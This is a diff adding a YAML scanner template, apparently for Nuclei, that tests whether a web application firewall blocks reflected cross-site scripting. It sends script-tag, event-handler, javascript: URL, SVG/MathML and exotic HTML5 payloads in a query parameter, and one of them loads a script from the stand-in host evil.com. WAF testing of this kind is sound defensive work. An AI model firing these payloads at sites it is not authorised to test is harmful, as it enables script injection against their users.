@@ -1,0 +1,163 @@
+id: waf-xss-basic-bypass
+info:
+  name: WAF XSS Basic Bypass
+  author: waftester
+  severity: high
+  description: |
+    Tests WAF effectiveness against fundamental cross-site scripting vectors.
+    Covers reflected XSS via script tags, event handlers, protocol handlers,
+    SVG injection, and various HTML element injection techniques. Tests both
+    GET and POST parameter vectors with multiple encoding styles.
+  reference:
+    - https://owasp.org/www-community/attacks/xss/
+    - https://portswigger.net/web-security/cross-site-scripting
+    - https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+    - https://html5sec.org/
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+  tags: xss,waf,bypass,owasp-a03,reflected,injection,waftester
+  classification:
+    cwe-id:
+      - CWE-79
+      - CWE-693
+  metadata:
+    verified: true
+    max-request: 22
+    shodan-query: "http.waf"
+    fofa-query: "header=\"WAF\""
+
+http:
+  # Classic script tag injection
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<script>alert(1)</script>"
+      - "{{BaseURL}}/?q=<script>alert(document.domain)</script>"
+      - "{{BaseURL}}/?q=<script>alert(String.fromCharCode(88,83,83))</script>"
+      - "{{BaseURL}}/?q=<script src=//evil.com/xss.js></script>"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert"
+          - "<script>alert(document.domain)"
+          - "<script src="
+        condition: or
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406 && status_code != 429"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+          - "Request Rejected"
+        negative: true
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "<script[^>]*>.*?</script>"
+
+  # Event handler injection - common handlers
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<img src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?q=<svg onload=alert(1)>"
+      - "{{BaseURL}}/?q=<body onload=alert(1)>"
+      - "{{BaseURL}}/?q=<input onfocus=alert(1) autofocus>"
+      - "{{BaseURL}}/?q=<marquee onstart=alert(1)>"
+      - "{{BaseURL}}/?q=<details open ontoggle=alert(1)>"
+      - "{{BaseURL}}/?q=<video src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?q=<audio src=x onerror=alert(1)>"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "onerror=alert"
+          - "onload=alert"
+          - "onfocus=alert"
+          - "onstart=alert"
+          - "ontoggle=alert"
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Protocol handler injection
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<a href=javascript:alert(1)>click</a>"
+      - "{{BaseURL}}/?q=<iframe src=javascript:alert(1)>"
+      - "{{BaseURL}}/?q=<form action=javascript:alert(1)><input type=submit>"
+      - "{{BaseURL}}/?q=<object data=javascript:alert(1)>"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "javascript:alert"
+          - "javascript:alert(1)"
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # SVG and math injection vectors
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<svg><script>alert(1)</script></svg>"
+      - "{{BaseURL}}/?q=<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?q=<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+      - "{{BaseURL}}/?q=<svg><set onbegin=alert(1) attributename=x to=1>"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Exotic HTML5 elements
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<isindex type=image src=1 onerror=alert(1)>"
+      - "{{BaseURL}}/?q=<keygen autofocus onfocus=alert(1)>"
+      - "{{BaseURL}}/?q=<meter onmouseover=alert(1)>0</meter>"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
